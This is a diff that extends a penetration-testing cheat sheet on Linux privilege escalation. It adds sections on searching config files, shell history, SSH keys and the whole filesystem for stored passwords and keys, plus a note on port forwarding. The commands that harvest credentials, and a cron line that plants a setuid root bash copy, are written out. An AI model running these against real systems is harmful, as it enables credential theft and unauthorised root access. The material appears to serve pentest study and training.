@@ -368,12 +368,56 @@ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /path/to/cron/script
 
 We can enumerate possible files that may contain credentials.
 
-Enumerate configuration files:
+### Configuration Files
+
+Enumerate files that contain config:
 
 ```bash
 find \-type f 2>/dev/null | grep "config" | xargs grep -i "password" 2>/dev/null
 find \-type f 2>/dev/null | grep "config" | xargs grep -i -E "username|password|key|database" 2>/dev/null
 find \-type f 2>/dev/null | grep "config" | xargs grep -i -E "username|password|key|database" 2>/dev/null | grep -v -E "debconf|keyboard"
+```
+
+Enumerate .conf files:
+
+```bash
+find / -name '*.conf' -type f 2>/dev/null | xargs grep -i -E "username|password|key|database" 2>/dev/null
+```
+
+### History Files
+
+Users' commands are recorded in history files when they are using specific programs. When a user types a password as part of a command, it may be saved in the history file. Switching to the root account with a found password is always a good idea.
+
+### History Privilege Escalation
+
+1. View the contents of hidden files in the user’s home directory with filenames ending in “history”:
+
+   ```text
+   cat ~/.*history | less
+   history
+   ```
+
+### Configuration Files
+
+Configuration \(config\) files are used by many services and programs to store settings. If a service needs to authenticate to something, the credentials may be saved in a configuration file. We may be able to log in as that user if these config files are open and the passwords they record are repeated by privileged users.
+
+1. The following is a list of the contents of the user's home directory:
+
+   ```text
+   ls -la
+   ```
+
+### SSH Keys
+
+To authenticate users using SSH, SSH keys can be used instead of passwords. SSH keys are split into two parts: a private key and a public key. The private key should be kept hidden at all times. If a user's private key is stored insecurely, anyone who has access to it may be able to authenticate to the server/target.
+
+### Filter Password
+
+We can enumerate recursively for the keywords:
+
+```bash
+grep -R -i 'password' / 2>/dev/null
+grep -RiE 'password|username|key' / 2>/dev/null
 ```
 
 ## SUDO
@@ -691,6 +735,14 @@ whoami
 # Expected Output
 root
 ```
+
+## Network
+
+### Port Forwarding
+
+A root process may be tied to a port listening only on localhost. If an attack cannot be launched locally on the target machine for some reason, the port can be forwarded to your local machine:
+
+{% embed url="https://wixnic.gitbook.io/hacknotes/port-redirection-and-tunneling/port-redirection" %}
 
 ## Misc
 
